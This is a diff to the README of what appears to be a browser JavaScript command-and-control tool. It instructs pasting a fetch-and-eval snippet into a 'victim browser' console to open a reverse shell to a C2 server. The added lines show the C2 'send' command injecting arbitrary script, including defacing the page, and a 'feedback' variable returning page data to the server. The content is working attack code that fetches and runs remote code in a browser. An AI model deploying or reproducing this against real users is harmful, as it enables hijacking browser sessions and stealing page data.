@@ -18,7 +18,23 @@ then in the victim browser, open devtools and paste the fetch-rev-shell.js conte
 const url = "http://localhost:8080/"; const r1 = await fetch(url + "get");const r2 = await r1.text(); eval(r2);
 ~~~
 
-now go to the console of the c2 server, you now have a javascript reverse shell into the current browser tab of the 
+now go to the console of the c2 server, you now have a javascript reverse shell into the current browser tab.
+
+in the server you will get a shell like this:
+
+~~~
+(c2)> 
+~~~
+
+To send something to the browser, use the **send** command:
+
+~~~
+(c2)> send console.log("hello world")
+~~~
+
+~~~
+(c2)> send document.body.innerHTML = "your browser is mine!!!"
+~~~
 
 ## Feedback
 
@@ -27,7 +43,7 @@ To get information back to the c2 server, you can use the *feedback* variable.
 for example to see the title of the current page:
 
 ~~~
-(c2)> feedback = document.title
+(c2)> send feedback = document.title
 ~~~
 
 The title will then be printed next time the browser sends a request
